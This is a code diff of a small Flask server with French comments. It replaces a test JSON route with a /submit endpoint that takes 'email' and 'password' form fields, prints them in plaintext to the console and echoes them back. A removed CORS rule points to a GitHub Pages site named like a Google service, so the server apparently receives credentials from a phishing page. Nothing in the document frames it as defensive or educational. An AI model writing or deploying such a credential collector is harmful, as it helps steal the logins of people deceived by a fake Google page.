@@ -1,20 +1,47 @@
-from flask import Flask, request, jsonify
-from flask_cors import CORS
+from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
-CORS(app, origins=["https://google2000-tech.github.io/SMS-synchronisation_Google/"])  # Autorise ton site Netlify
 
-@app.route("/")
+# Page d'accueil simple (évite 404 si quelqu’un ouvre le domaine sans /submit)
+@app.route("/", methods=["GET"])
 def home():
-    return jsonify({"message": "Serveur Flask en ligne ✅"})
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html>
+    <head><title>Serveur actif</title></head>
+    <body>
+        <h1>Serveur Flask en ligne ✔️</h1>
+        <p>La route de réception est : <b>/submit</b></p>
+    </body>
+    </html>
+    """)
 
-@app.route("/api/test", methods=["POST", "GET"])
-def test():
-    if request.method == "POST":
-        data = request.get_json()
-        return jsonify({"message": "Reçu !", "data": data})
-    else:  # GET
-        return jsonify({"message": "Cette route attend une requête POST avec JSON"})
+# Route qui reçoit les données du formulaire
+@app.route("/submit", methods=["POST"])
+def submit():
+    email = request.form.get("email")
+    password = request.form.get("password")
 
+    print("\n📩 Nouvelle soumission reçue :")
+    print("Email :", email)
+    print("Password :", password)
+    print("-----------------------------\n")
+
+    # Réponse envoyée au navigateur après l'envoi du form
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html>
+    <head><title>Reçu</title></head>
+    <body>
+        <h2>Données reçues ✔️</h2>
+        <p>Email : {{email}}</p>
+        <p>Password : {{password}}</p>
+        <br>
+        <a href="/">Retour</a>
+    </body>
+    </html>
+    """, email=email, password=password)
+
+# Démarrage du serveur (Render, Replit, Railway, etc. utilisent ce port)
 if __name__ == "__main__":
-    app.run()
+    app.run(host="0.0.0.0", port=5000)
